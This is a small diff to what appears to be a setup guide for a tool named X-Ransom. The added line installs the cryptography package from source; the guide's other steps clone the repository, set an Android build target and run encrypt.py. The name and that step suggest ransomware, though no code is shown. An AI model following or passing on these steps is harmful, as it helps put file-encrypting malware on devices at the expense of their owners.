@@ -16,6 +16,7 @@
 - git clone https://github.com/MrG3P5/X-Ransom
 - cd X-Ransom
 - export CARGO_BUILD_TARGET=aarch64-linux-android
+- pip3 install cryptography --no-binary cryptography
 - pip3 install -r require.txt
 - python3 encrypt.py
 ```
